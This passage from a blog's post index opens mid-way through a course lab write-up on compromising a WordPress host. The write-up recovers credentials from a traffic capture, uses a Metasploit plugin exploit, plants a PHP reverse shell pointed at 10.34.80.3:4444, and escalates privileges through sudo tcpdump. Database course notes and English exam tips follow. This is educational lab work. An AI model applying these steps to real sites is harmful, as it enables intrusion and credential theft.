在获取了网站数据流信息后，我们尝试使用wireshark进行一次分析；尝试搜索一下login，结果有惊奇的发现； 成功找到了登陆界面: 我们随便提交一个，找到信息post去的地址： 确定了之后就去找发送到相应url下的post信息； 尝试筛选http请求类型为post的请求，找到了这两个： 可以看到账号密码就在这里，密码好像是做了一定的加密，当时这个不是问题； 我们把burp打开，然后随便输入一个账号和密码，在burp里面给他改一下，然后再把请求放过去就可以了； 下图是我们的请求； 很明显可以发现，log对应的是用户名，pwd对应的是密码；然后我们把他给改掉 成功进入网站后台! ¶1x08 使用wordpress的插件漏洞进行提权 这里可以使用三种方案进行实现： ¶2x01 MeterSploit + reflex gallery 首先我们先需要给这个wordpress安装reflex gallery插件； 去plugins界面搜索一下reflex，安装上去就好； 当然了你也可以选择本地上传安装； 安装成功之后记得把插件激活一下！ 接下来使用msf来控制漏洞： 出现meterpreter&gt;说明可以控制了，我们可以在这里输入Linux命令来查看一些文件： 回退到/var/www/html之后可以看到wp-config.php； 查看一下里面的内容： 可以在里面找到数据库的用户和密码： ¶2x02 反弹Shell 上传反弹shell。http://pentestmonkey.net/tools/web-shells/php-reverse-shell 【目的：PHP网站渗透；实现途径：上传网站后，URL访问(含有)该反弹shell的页面。 功能：该脚本会发起反弹TCP连接到攻击者（脚本中指定攻击者IP地址和端口号）。】 我们把代码稍微修改一下，ip改成10.34.80.3, 反弹端口设为4444； 首先需要把这里的theme给修改为Twenty Sixteen，记得点击Select，然后点击Leave！ 然后将php文件复制粘贴过来==》记得upload！ 注意一下，因为我实在找不到404.PHP的url路径，所以我就改了search.php，效果就是搜索的时候触发 还有一件事! , 因为刚才修改了theme，这里需要把对应的主界面也改了；（不改好像也行） 接下来我们使用kali的nc监听刚才设置的4444端口。 现在我们search一下就可以发现nc里面已经可以操作了！ 经过路径的探寻后找到了wp_config.php 文件 ¶2x03 利用文件管理插件（File manager）漏洞 这个没啥技术含量，安装了插件之后直接就可以查看了；这里就不写了 ¶1x09 ssh登陆该网站 这里我们尝试用上一步中获取的数据库密码来登陆 结果发现遇到了这个问题： 这里我们进行一下修改配置文件，sudo vim /etc/ssh/ssh_config打开这个文件，然后在最下面添加： # StrictHostKeyChecking ask改成StrictHostKeyChecking no 然后输入：ssh webdeveloper@10.34.80.3 成功登录了进来! 尝试查看发现权限不足： 查看一下可以执行的sudo命令 发现可以root权限执行tcpdump命令 创建攻击文件 tcpdump命令详解： -i eth0 从指定网卡捕获数据包 -w /dev/null 将捕获到的数据包输出到空设备（不输出数据包结果） -z [command] 运行指定的命令 -Z [user] 指定用户执行命令 -G [rotate_seconds] 每rotate_seconds秒一次的频率执行-w指定的转储 -W [num] 指定抓包数量 ¶0x03 实验小结 本次的实验中完整的做了一次从发现目标主机到获取flag的过程，在实现的过程中包括了 通过扫描发现目标主机 根据主机开放的80端口找到其的网页 通过扫描网页目录找到流量包 Wireshark解析流量包 获取管理员密码 根据网页的cms找到通用漏洞 tcpdump提权 总之这次的实验做的很爽","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"网络渗透测试","slug":"课程学习/网络渗透测试","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/tags/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"网络渗透测试","slug":"网络渗透测试","permalink":"http://blog.keter.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"「pandoc」MarkDown2Word","slug":"【pandoc】MarkDown2Word","date":"2021-04-12T06:01:02.000Z","updated":"2021-08-17T09:07:00.000Z","comments":true,"path":"2021/04/12/【pandoc】MarkDown2Word/","link":"","permalink":"http://blog.keter.top/2021/04/12/%E3%80%90pandoc%E3%80%91MarkDown2Word/","excerpt":"","text":"只能说pandoc yyds！ 1pandoc -s 2-test.md -o test.docx --reference-doc reference.docx 点击下载：reference.docx","categories":[],"tags":[{"name":"pandoc","slug":"pandoc","permalink":"http://blog.keter.top/tags/pandoc/"}]},{"title":"「课程学习」Database-Review","slug":"【课程学习】Database-Review","date":"2021-04-11T06:01:02.000Z","updated":"2021-08-13T14:40:17.000Z","comments":true,"path":"2021/04/11/【课程学习】Database-Review/","link":"","permalink":"http://blog.keter.top/2021/04/11/%E3%80%90%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0%E3%80%91Database-Review/","excerpt":"¶DataBase Review ¶关系代数 选择： σF(R)\\sigma_{F}(R)σF​(R) SELECT * FROM R WHERE F 投影：∏A(R)\\prod_{A}(R)∏A​(R) SELECT A FROM R ¶连接： ¶笛卡尔积： 现在有两个表如下： 12345678910111213141516171819sql&gt; select * from S;+------+------+| A | B |+------+------+| 1 | 2 || 3 | 3 || 5 | 9 |+------+------+3 rows in set (0.00 sec)sql&gt; select * from R;+------+------+| B | C |+------+------+| 2 | 1 || 7 | 2 || 3 | 5 |+------+------+3 rows in set (0.00 sec) 进行笛卡尔积操作后为： 123456789101112131415sql&gt; select * from S,R;+------+------+------+------+| A | B | B | C |+------+------+------+------+| 1 | 2 | 2 | 1 || 3 | 3 | 2 | 1 || 5 | 9 | 2 | 1 || 1 | 2 | 7 | 2 || 3 | 3 | 7 | 2 || 5 | 9 | 7 | 2 || 1 | 2 | 3 | 5 || 3 | 3 | 3 | 5 || 5 | 9 | 3 | 5 |+------+------+------+------+9 rows in set (0.00 sec) 笛卡尔积的连接会对两个表的每一列进行排列组合","text":"¶DataBase Review ¶关系代数 选择： σF(R)\\sigma_{F}(R)σF​(R) SELECT * FROM R WHERE F 投影：∏A(R)\\prod_{A}(R)∏A​(R) SELECT A FROM R ¶连接： ¶笛卡尔积： 现在有两个表如下： 12345678910111213141516171819sql&gt; select * from S;+------+------+| A | B |+------+------+| 1 | 2 || 3 | 3 || 5 | 9 |+------+------+3 rows in set (0.00 sec)sql&gt; select * from R;+------+------+| B | C |+------+------+| 2 | 1 || 7 | 2 || 3 | 5 |+------+------+3 rows in set (0.00 sec) 进行笛卡尔积操作后为： 123456789101112131415sql&gt; select * from S,R;+------+------+------+------+| A | B | B | C |+------+------+------+------+| 1 | 2 | 2 | 1 || 3 | 3 | 2 | 1 || 5 | 9 | 2 | 1 || 1 | 2 | 7 | 2 || 3 | 3 | 7 | 2 || 5 | 9 | 7 | 2 || 1 | 2 | 3 | 5 || 3 | 3 | 3 | 5 || 5 | 9 | 3 | 5 |+------+------+------+------+9 rows in set (0.00 sec) 笛卡尔积的连接会对两个表的每一列进行排列组合 ¶等值连接 θ\\thetaθ 为“＝” 的连接运算称为等值连接。它是从关系R与S的笛卡尔积中选取A、B属性值相等的那些元组。即等值连接为： ¶自然连接 自然连接（Natural join）是一种特殊的等值连接，它要求两个关系中进行比较的分量必须是相同的属性组，并且要在结果中把重复的属性去掉。即若R和S具有相同的属性组B，则自然连接可记作： ¶外连接 ¶左连接 在自然连接的基础上补上左集合中没有的列。没有对应值的项补null ¶右连接 在自然连接的基础上补上右集合中没有的列。没有对应值的项补null 外连接就是左连接和右连接的组合。 ¶除法 去看： https://www.jianshu.com/p/d80dbaef637e 讲的好啊 还有：https://blog.csdn.net/qq_35361859/article/details/105027905 也不错 ¶SQL语句的一些高级操作 ¶WHERE 123456789# between andselect * from my_auto where age between 20 and 22;# inselect * from my_auto where age in (20,30);# like or not likeselect * from my_auto where age like &#x27;Li%&#x27; # 以Li开头的学生select * from my_auto where age like &#x27;Li_&#x27; # 代替任何一个字符 总结 where 子句的目的是通过条件匹配进行数据的筛选，数据筛选的原理是在数据表（磁盘）进行； where中可以通过多种运算符来实现数据匹配：比较，逻辑，空运算，匹配运算； 在使用多种运算符的时候，需要考虑运算符的优先级； ¶DISTINCT Distinct 去重针对的是所有查出来的字段数据，记录相同则去重，而不是某一个字段值重复； 1select distinct * from my_student; ¶GROUP BY 语法：where 后 gourp by class_name 1select class_name from my_student group by class_name Group by 分组原理 按照分组字段，将获取到的记录分为几块 保留每块的第一条记录 group by 的目的： 实现分组统计，分组统计主要要用到一下的聚类函数 count(*/字段名)： 统计分组字段对应的记录数量 max(字段名)：统计分组后某个字段的最大值 min(字段名)：统计分组后某个字段的最小值 avg(字段名)：统计分组后某个字段的平均值 sum(字段名)：统计分组后某个字段的和 ¶HAVING 子句 定义：where是从磁盘读取数据时进行判断，而在数据进入内存之后where就不能生效了，HAVING是完全针对进入内存后的数据进行判定。 HAVING 语法： HAVING几乎能做所有WHERE能做的事情：HAVING条件判断 1select * from my_student having id = 1; having主要针对group by后的统计结果进行判断 比如: 统计班级人数大于1的班级 1select count(*) number,class_name,group_concat(name) from my_student group by class_name having number &gt; 1; 注意： having 子句中用到的字段，必须在select后出现过，即字段从磁盘读入到内存当中。 having 条件判断中可以直接使用聚类函数 上面语句也可以替换为： 1select count(*) , class_name,group_concat(name) from my_student group by class_name having count(*) &gt; 1; ¶ORDER BY 子句 定义：order by即通过某个字段，使得表对应的校对集实现升序或者降序排序。 order by语法： order by 字段 [ASC][DESC] ; 其中ASC是升序，DESC为降序 1select * from my_student order by age; ¶EXISTS EXISTS的子查询不反回任何的数据，只会产生逻辑真值 true/flase 语法： 查询所有选修了1号课程的学生姓名 123select snamefrom Studentwhere exists(select * from sc,Student where sc.sno = Student.sno); EXISTS还可以表示关系代数中的除法操作： 比如：查询至少选修了学号为‘200215121’选修的全部课程的学生号码 关系代数为： πsno,cno(SC)÷πcno(σ′200215121′(SC))\\pi_{sno,cno}(SC) \\div \\pi_{cno}(\\sigma_{&#x27;200215121&#x27;}(SC))πsno,cno​(SC)÷πcno​(σ′200215121′​(SC)) SQL语句为： 可以理解为for循环嵌套 123456789SELECT DISTINCT snoFROM SC SCXWHERE NOT EXISTS (SELECT * FROM SC SCY WHERE SCY.sno=&#x27;201215122&#x27; AND NOT EXISTS (SELECT * FROM SC SCZ WHERE SCZ.sno=SCX.sno AND SCZ.cno=SCY.cno)); ¶视图 ¶定义视图 语法： CREATE VIEW &lt;视图名&gt; [&lt;列名&gt;, &lt;列名&gt;, …] AS &lt;子查询&gt; [WITH CHECK OPTION] 其中子查询可以是任意的SELECT语句，是否可以含有ORDER BY子句和DISTINCT短语，则取决于具体系统的实现； WITH CHECK OPTION 作用：在对视图进行插入修改和删除时，关系数据库管理系统会自动记上select中的条件； 例如：建立信息系学生的视图，并要求进行修改和插入操作时仍然需要保证该视图有信息系的学生； 123456CREATE VIEW IS_StudentAS SELECT Sno,Sname,Sage FROM StudentWHERE Sdept=&#x27;IS&#x27;WITH CHECK OPTION; 带有聚焦函数的语句 例如： 将学生的学号和平均成绩定义为一个视图； 12345CREATE VIEW S_G(Sno,Savg)ASSELECT Sno,AVG(Grade)FROM SCGROUP BY Sno; ¶删除视图 语法：DROP VIEW [CASCADE] CASCADE级联删除语句把视图和由他导出的所有视图一起删除了； ¶查询和更新视图 视图建立完之后就可以对视图像数据库一样进行查询和更新啦。 ¶视图的作用： 视图能够简化用户的操作 视图是用户能以多种角度看待同一数据 视图对重构数据库提供了一定程度的逻辑独立性 视图能够对机密数据提供安全保护 适当利用视图可以更加清晰地对表达查询 ¶数据库的安全性 ¶授权：授予和收回 GRANT GRANT语句的一般格式为： 1234GRANT &lt;权限&gt;[，&lt;权限&gt;]ON &lt;对象类型&gt;&lt;对象名&gt;[,&lt;对象类型&gt;&lt;对象名&gt;]TO &lt;用户&gt;[,&lt;用户&gt;][WITH GRANT OPTION] 接受授权的用户可以是一个或者多个具体用户，也可以PUBLIC，即全体用户。 如果是所有权限则可以使用ALL PRIVILEGES 如果指定了WITH GRANT OPTION子句，则获得某种权限的用户还可以把这种权限再授权其他的用户。没有的用户则不能传播该权限。 例如： 1234567891011-- 把查询Student表的权限授权给用户U1GRANT SELECT ON TABLE Student TO U1;-- 把对Student和Course表的全部操作权限授予用户U2和U3GRANT ALL PRIVILEGES ON TABLE Student,Course TO U2,U3;-- 把对表SC的查询权限授予所有用户并允许将该权限进行传播GRANT Select ON TABLE SC TO PUBLIC WITH GRANT OPTION;-- 每个学生具有查询SC表中自己信息的权限GRANT Select ON SC WHEN USER()=Sname TO PUBLIC; REVOKE REVOKE 语句的意义是从某个角色/角色组那里收回权限 123REVOKE &lt;权限&gt;[，&lt;权限&gt;]ON &lt;对象类型&gt;&lt;对象名&gt;[,&lt;对象类型&gt;&lt;对象名&gt;]FROM &lt;用户&gt;[,&lt;用户&gt;] ¶视图机制 通过为不同的用户定义不同的视图，把数据对象限制在一定的范围内。也就是说通过视图机制把要保密的数据对无权存取对用户隐藏起来，从而自动对数据提供一定程度的安全保护。 例如：将视图CS_Student的SELECT权限授予U1 123GRANT SELECTON CS_StudentTO U1; ¶外键约束 定义：外间FOREIGN KEY，指在一张表中有一个字段指向另一个表的主键字段，并且通过外键关联会有一些约束效果 思考：在学习表关系的时候，在一对多或者多对多的时候，都会在一张表中增加一个字段来指向另一个表的主键，但是此时其实指向没有任何的实际含义，需要人为的去记住，这样有啥意义呢？ 引入：如果只是需要人为的去记住对应的关系，没有任何数据库本身去控制的话，那样的存在没有价值。外键就是负责这样的一个作用啦。 ¶外键 定义：外键就是在设定呢字段属于其他表的主键后，使用FOREIGN KEY关键字让表字段与另外表的主键产生内在关联关系。 创建表的使用 FOREIGN KEY (Cno) REFERENCES Course(Cno) 【标准SQL语句】 12345678CREATE TABLE SC(Sno CHAR(9) NOT NULL, Cno CHAR(4) NOT NULL, Grade SMALLINT, PRIMARY KEY (Sno,Cno), FOREIGN KEY(Sno) REFERENCES Student(Sno), FOREIGN KEY(Cno) REFERENCES Student(Cno)); ¶外键约束 定义：外键约束，即外键的增加之后对应的父表和子表都有相应的约束关系 外键增加后默认字段插入的数据对应的外键字段必须在浮标存在，否则会报错 外键增加后默认父表主键如果在外键值有使用，那么不能更新主键值，也不能删除主键所有记录 外键的作用： 限定子表（外键所在表）不能插入主表中不存在的外键值（不能更新） 限定父表（主键被引用）不能删除或者更新子表有外键引用的主键信息 可以在创建外键的之后制定外键的约束效果：即控制父表的操作对子表的影响 控制情况 on update：父表更新与子表有关联的主键时 on delete：父表删除与子表有关联的主键时 控制效果 cascade：级联操作，即父表怎么样，子表有对应关系的记录就怎么样 set null：置空操作，即父表变化，子表关联的记录对应的外键字段置空（注意：能够使用的前提是外键对应的字段允许空） restrict/no action：严格模式，即不允许父表操作 通常的搭配如下： on update cascade: 父表更新，子表级联更新 on delete cascade: 父表删除，子表对应外键置空 总结 外键约束分为父表的约束和对子表的约束，其中子表的约束是固定的不能插入父表不存在的外键值 父表外键约束可以通过设定on update和on delete事件来控制，控制方式有cascade，set null和restrict三种 外键的强大约束作用可以保证数据的完整性和有效性 外键的强大约束有可能操作负面影响：数据维护变的困难，所以实际开发中需要根据需求选择使用 外键总有InnoDB存储引擎支持，Mylsam不支持 ¶用户定义的完整性 定义：用户定义的完整性就是针对某一个具体应用的数据必须满足语义要求。 属性上的约束条件 在创建表时可以给表中的一些字段规定一些属性： 列值非空（NOT NULL） 列值唯一（UNIQUE） 检查列值是否满足一个条件表达式（CHECK 短语） 1234CREATE TABLE SC(Sno CHAR(9) NOT NULL, Cno CHAR(9) UNIQUE, GRADE NUMBER CHECK(GRADE BETWEEN 0 AND 100); 元组上的约束 与属性上的约束条件定义类似，不过元组级的限制可以设置不同属性之间的取值互为约束条件。 语法： CHECK(…) 12345678910CREATE TABLE Student( Sno CHAR(9), Sname CHAR(8) NOT NULL, Ssex CHAR(2), Sage SMALLINT, Sdept CHAR(20), PRIMARY KEY(Sno), CHECK(Ssex=&#x27;女&#x27; OR Sname NOT LIKE &#x27;Ms.%&#x27;)); 当往表中插入援助否则修改属性的时候，关系数据库关系系统会自动检查元组上的约束条件时候被满足，如果不满足则操作被拒绝执行。 ¶完整性约束命名子句 SQL 在 CREATE TABLE语句中提供了完整性约束命名子句CONSTRAINT，用来对完整性约束条件命名，从而可以灵活地增加、删除一个完整性约束条件。 完整性约束命名子句 语法：CONSTRAINT &lt;完整性约束条件名&gt;&lt;完整性约束条件&gt; 123456CREATE TABLE Student( Sno NUMBERIC(6) CONSTRAINT C1 CHECK(Sno BETWEEN 90000 AND 99999), ...) 修改表中的完整性限制 可以使用ALTER TABLE 语句修改表中的完整性限制 12ALTER TABLE Student DROP CONSTRAINT C1; ¶范式 ¶几个函数依赖 设R(U)是属性集U上的关系模式，X，Y是U的子集。若对于R(U)的任意一个可能的关系r，r中不可能存在两个元组在X上的属性值相等，而在Y上的属性值不等，则称X函数确定Y或Y函数依赖于X，记住X-&gt;Y 部分函数依赖： 设X,Y是关系R的两个属性集合，存在X→Y，若X’是X的真子集，存在X’→Y，则称Y部分函数依赖于X。 例子：学生基本信息表R中（学号，身份证号，姓名）当然学号属性取值是唯一的，在R关系中，（学号，身份证号）-&gt;（姓名），（学号）-&gt;（姓名），（身份证号）-&gt;（姓名）；所以姓名部分函数依赖于（学号，身份证号）； 完全函数依赖： 设X,Y是关系R的两个属性集合，X’是X的真子集，存在X→Y，但对每一个X’都有X’!→Y，则称Y完全函数依赖于X。 =例子：学生基本信息表R（学号，班级，姓名）假设不同的班级学号有相同的，班级内学号不能相同，在R关系中，（学号，班级）-&gt;（姓名），但是（学号）-&gt;(姓名)不成立，（班级）-&gt;(姓名)不成立，所以姓名完全函数依赖与（学号，班级); 传递函数依赖： 设X,Y,Z是关系R中互不相同的属性集合，存在X→Y(Y !→X),Y→Z，则称Z传递函数依赖于X。 例子：在关系R(学号 ,宿舍, 费用)中，(学号)-&gt;(宿舍),宿舍！=学号，(宿舍)-&gt;(费用),费用!=宿舍，所以符合传递函数的要求；即费用传递函数依赖于学号 ¶属性集的函数依赖 就是将所有的可以推导出来的函数依赖关系全部给加进去，需要注意的就是有一个和空集的关系 剩下的就是对各个元素闭包的排列组合；比如上面的例题中 (A)+_++​ = ABC, 所以他就对应了如图的ABC的所有排列组合情况再加一个对空集对关系。 ¶码 ¶候选码的概念 这样一个集合，他可以推出所有的属性，但是他的任意一个真子集无法退出所有的属性。 . ¶如何求候选码？ 只出现在左边的一定是候选码中的元素 只出现在右边的一定不是候选码中的元素 左右都出现的不一定 左右都不出现的一定是候选码中的元素 在确定了可能出现的元素之后就可以使用闭包运算进行测试：如果组合可以推出所有的属性话就说明是候选码。 , 如果三个一组推不出来的话，就再加变成4个一组 1闭包：BD的闭包 是指由BD能推出来的所有属性 主属性： 候选码中的属性都是主属性 ¶第一范式 定义：第一范式，在设计表存储数据的时候，如果表中设计的字段存储的数据，在取出来使用之前还需要额外的处理（拆分）就不符合1NF，第一范式就是处理数据颗粒度大的问题 1.案例:设计一张学生选修课成绩表 学生 性别 课程 教室 成绩 学习时间 张三 男 PHP 101 100 2月1日,2月28日 李四 女 Java 102 90 3月1日,3月31日 张三 男 Java 102 95 3月1日,3月31日 2.以上表设计是一种非常常见的数据,但是如果想要知道学生上课的开始时间和结束时间,那就意味着这个学习时间取出之后需要再进行拆分,因此就不符合1NF。要保证数据取出来就可以直接使用,就需要将学习时间进行拆分。 学生 性别 课程 教室 成绩 开始时间 结束时间 张三 男 PHP 101 100 2月1日 2月28日 李四 女 Java 102 90 3月1日 3月31日 张三 男 Java 102 95 3月1日 3月31日 总结： 要满足1NF就是要保证数据在实际使用的时候不用对字段数据进行二次拆分 1DF的核心就行数据要有原子性（不可拆分） ¶第二范式 以上数据表的设计中满足了原子性，但是学生在某个课程中应该只有一个考试成绩，也就是说学生对应的课程的成绩应该是有唯一性的，那么以上数据表应该如何进行设计呢？ 引入：要解决以上问题，其实很简单就是学生姓名和课程名字应该说唯一的，那么只要增加一个复合主键即可。 定义： 第二范式（2NF），在数据表的设计过程中如果有复合主键（多字段主键），且表中有字段且并不是由整个主键来确定，而是依赖主键中的某个字段（主键的部分）：存在字段依赖主键的部分的问题，称之为部分依赖：第二范式就是要解决表设计中非主属性对主属性的部分依赖。 以上表中性别有学生决定，而不受到课程影响；同时教室由课程决定，而不受到学生影响。此时形成了字段部分依赖部分主键的情况，因此会存在部分依赖问题，也就不满足第二范式。 解决方案：就是让字段不会存储依赖部分主键的问题，因此需要做的就是增加一个逻辑主键字段：性别依赖学生但学生不是主键，教室依赖课程也不是主键。 以上虽然解决了依赖问题，但是学生和课程又不具有唯一性了，所以应该增加符合唯一键：unique(学生，课程) 总结： 第二范式就是解决字段部分依赖主键的问题，也就是部分字段依赖的问题 思考： 上述表虽然满足了1NF和2NF，但是总感觉怪怪的，理论上讲性别逻辑主键除外，实际业务主键还是学生和课程，这个表应该是学生与课程对应的成绩，为什么会出现性别和教室呢？ 引入：之所以会出现上述矛盾，原因就是我们将数据都揉到了一张表里面，而且出现了性别依赖学生，而学生依赖ID，形成了字段性别依赖非主键字段学分的问题，也就是触法了3NF的问题。 ¶第三范式 定义：第三范式（3NF），理论上讲，应该一张表中的所有字段都应该直接依赖主键（逻辑主键：代表的是业务主键），如果表设计中存在这样一个字段，并不直接依赖主键，而是通过某一个非主键字段依赖，最终实现依赖主键：把这种不是直接依赖主键，而是依赖主键非主键字段的依赖关系称之为传递依赖。第三范式就是要解决传递的问题。 第三范式的解决方案：如果某一个表中有字段依赖非主键字段，而被依赖字段依赖主键，我们就应该将这种非主键依赖关系进行分离，单独形成一张表。 学生表： 课程表： 此时，虽然性别依然依赖姓名而不是Stu_id, 教室依赖课程而不是Class_id, 那是因为Stu_id和Class_id代表逻辑主键，而不是实际的业务主键，学生表的实际主键应该是姓名，课程表的实际主键应该是课程 新学生选修课成绩表的设计，应该就是去的对应学生表和课程表的ID 总结 第三范式是不允许传递依赖：即有字段依赖非主键字段； 消除传递依赖的方案就是将相关数据对应创建一张表； ¶第三范式的模式分解 求出第三范式对应函数集的最小函数依赖 Fm，使用左部相同合并原则： Fm中左边相同的合并成一个数据表 例1：U=(A,B,C,D,E,G) F={BG-&gt;C，BD-&gt;E，DG-&gt;C，ADG-&gt;BC，AG-&gt;B，B-&gt;D} 若R不是3NF，将R分解为无损且保持函数依赖的3NF。 很简单可以求出候选键为AG 求最小函数依赖 (BG)+(BG)^+(BG)+ = {BCDEG} G在其中，删除 (BD)+(BD)^+(BD)+ = {BD} , E不在其中，保留 (DG)+(DG)^+(DG)+ = {DG}, C不在其中，保留 (ADG)+(ADG)^+(ADG)+ = {ABCDG}, B在其中，C也在其中，删除 (AG)+(AG)^+(AG)+ = {AG}, B不在其中，保留 (B)+(B)^+(B)+ = {B} , D不在其中保留 可以得到：F = {BD-&gt;E, DG-&gt;C, AG-&gt;B, B-&gt;D} 接下来判断一下左边有没有冗余； BD-&gt;E: (B+)(B^+)(B+)=BD, D 在里面，所以D有冗余 (D+)=D(D^+)=D(D+)=D, B不在里面所以B没有冗余 所以用B-&gt;E 替换，BD-&gt;E 同理可以得到Fm = {B-&gt;E, DG-&gt;C, AG-&gt;B, B-&gt;D} 根据左部相同原则进行合并 根据左部相同原则可以得到： R1 = BED, R2 = CDG, R3 = ABG . 因为AG已经在R3中了所以得到的分解是无损分解 ¶BCNF范式 在3NF的基础上如果所有的函数依赖的左边都是超码，那这个关系就满足第三范式；如果有一个不是超码就不满足； 超码： 一个码的闭包如果就是这个集合，那这个码就叫做超码 ¶BCNF范式的模式分解 … ¶Armstrong 公理系统 设U为属性集总体，F是U上的一组函数依赖，于是又关系模式R&lt;U,F&gt;，对于R&lt;U,F&gt;来说有以下的推理规则 由上面的三个公理我们可以得到： ¶最小函数依赖集 F中的每一个依赖，都不可以被其他的依赖推出，且右边一定是单元素 如何求最小依赖集？ Step1： 把右边的元素拆分成单个的 Step2： 对所有的依赖意义排查，找出多余的 . 排查A-&gt;B： 把A-&gt;B去掉,那么F=(B-&gt;A, B-&gt;C,A-&gt;C, C-&gt;A) 且(A)_+ = AC,不包含B,所以排除嫌疑,保留 排查B-&gt;A：把B-&gt;A去掉,那么F={A-&gt;B,A-&gt;C,C-&gt;A} 且(B)_+=BCA,包含A,就是嫌疑人,剔除 … 注：由于排查的顺序不一样可能会造成最小依赖集的不同 ¶模式分解 ¶无损分解 分解之后可以自然连接结合起来 . ¶保持函数依赖 保持函数依赖就是F分解之后还能够还原回来 考题：如何把数据库分解成3NF，并保持无损分解和函数依赖 Step1： 求出最小函数依赖集 Step2：把不在F中的属性全部找出来，单独分出一类，并从这些属性中删除 Step3：把每个依赖左边相同的分成一类 Step4：如果候选码没有出现在分类中，把任意一个候选码作为一类 . 例：U=(A,B,C,D,E) F={AB-&gt;C，C-&gt;B，D-&gt;E，D-&gt;C} 若R不是3NF，将R分解为无损且保持函数依赖的3NF。 解：易求得，码是AD，属于1NF 第一步：U1=ABC U2=BC U3=DCE 第二步： 将R分解为ρ={ R1({A,B,C}，{AB-&gt;C})， R2({B,C}，{C-&gt;B})， R3({D,E}，{D-&gt;E,D-&gt;C}) } 合并吸收： ρ={ R1({A,B,C}，{AB-&gt;C,C-&gt;B})， R2({D,E}，{D-&gt;E,D-&gt;C}) } 第三步：不是无损连接，添加码。 R3({A,D}，{∅}) 所以ρ={ R1({A,B,C}，{AB-&gt;C,C-&gt;B})， R2({D,E}，{D-&gt;E,D-&gt;C}), R3({A,D}，{∅}) } ¶数据库设计 ¶ER图转关系模式 去看： https://blog.csdn.net/Flora_SM/article/details/84645752 这里讲的非常好！ ¶高阶操作总结 ¶自身连接查询 对自身进行笛卡尔积连接 例如：选修关系elective(sno, cno, grade) 查询选修了CO2和CO4课程的学生的学号 1SELECT e1.sno from elective e1,elective e2 WHERE e1.sno = e2.sno AND e1.sno=&#x27;CO2&#x27; AND e2.sno=&#x27;CO4&#x27; ¶EXIST实现除法操作 ¶除法的语义 除法的真正的语义应该为包含。常见的表述形式有： 查询至少…的对象 查询xx了全部的对象 查询xx包含了xx的对象、 ¶举个栗子 假设教学数据库中已建立三个关系： 学生关系 student(sno, sname, sex, birth, height, class, address) 课程关系course(cno, cname, credit) 选修关系elective(sno, cno, grade) 检索学习全部课程的学生姓名。 123456789101112SELECT s.sname FROM student sWHERE NOT EXIST( SELECT * FROM course c WHERE NOT EXIST( SELECT * FROM elective e WHERE e.sno=s.sno AND c.cno=e.cno )); 检索至少选修了课程号为S08的学生的学号 关系代数： πsno,cno (elective)÷πcno (σcno=′s08′((elective))))\\pi_{\\text {sno,cno }}( elective ) \\div \\pi_{\\text {cno }}(\\sigma_{cno=&#x27;s08&#x27;}( (elective))))πsno,cno ​(elective)÷πcno ​(σcno=′s08′​((elective)))) SQL语句： 12345678910111213SELECT DISTINCT e1.sno FROM elective e1WHERE NOT EXIST( SELECT * FROM elective e2 WHERE e2.cno=&#x27;s08&#x27; AND NOT EXIST( SELECT * FROM elective e3 WHERE e1.sno=e3.sno AND e2.cno=e3.cno )) ¶那些常用的关键词 REFERENCES FOREIGN GRANT ALL PRIVILEGES PRIMARY KEY DESC【降序】 CASCADE","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"数据库","slug":"课程学习/数据库","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/tags/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"数据库","slug":"数据库","permalink":"http://blog.keter.top/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"「English」六级复习资料","slug":"【English】六级备考资料","date":"2021-03-10T06:01:02.000Z","updated":"2021-08-17T09:06:50.000Z","comments":true,"path":"2021/03/10/【English】六级备考资料/","link":"","permalink":"http://blog.keter.top/2021/03/10/%E3%80%90English%E3%80%91%E5%85%AD%E7%BA%A7%E5%A4%87%E8%80%83%E8%B5%84%E6%96%99/","excerpt":"","text":"coronaPolvo 在这里许个愿望，希望2021年6月份的六级考试可以过 ¶写作部分 六级写作常见题型： 论说文 （基本就是他了）、谚语、图画图表、书信 单词 - &gt; 句子 - &gt; 文章 ¶常见的土单词排行榜 土单词一个也不要出现！ ¶think have been convinced that argue be of the opinion that ¶many a sea of multitudes of Plentiful ¶people, we, us 要求用词要准确 个人：private individuals 年轻人：youngsters and teenagers 专家和教授：experts and professors 所有人：all children and adults ¶very exceedingly distinctly outstandingly strikingly ¶important Play a crucial role in sth significant ¶一些替换原则 人称代词使用被动进行替换 逻辑单词替换在后面 ¶写作中可能用到的万能句型 ¶主语从句 这个句型可以写到作文的任何地方，任何一句话的前面用来拉长句子； It seems beyond dispute that … ¶定语从句 which引导的非限定定语从句可以修饰前面一整句话； 这句话可以写作作文中任何一句话的后面。用作补充说明； which has been widely accepted ¶万能状语 as every one can see it with the rapid advance of science and technology in our contemporary society in the general routine of everyday living ¶万能插入语 写在某一段，段首句的主谓之间 to tell the truth ¶强调句型 只是作强调，作文中所有的句子都可以写成强调句型，只要不强调谓语就行； 推荐写在每一段的段首句； ¶文章 ¶谚语警句类 第一段：引出主题+解释你对这句话的理解（3句） Nowadays, there remains an increasing interest in the topic about … ; 替换单词之后，用前面的句型稍做加工 第二、三句：解释这句话的意思 The meaning of the saying seems that… , 如果实在解释不了，就把原句做一下单词修改给抄上去，然后在做一下句型加工； 第二段：举例 (3-4句) Although so abundant cases can support my simple view. The following one is most favorable. 大概思路：我有一个什么什么样的xx像什么什么样，他是一个什么什么样的人，但是不拉不拉，所以我们要向他学习做一个xxx的人。 第三段：总结（4句话） 总结句 + 具体措施1 + 具体措施2 + 喊口号 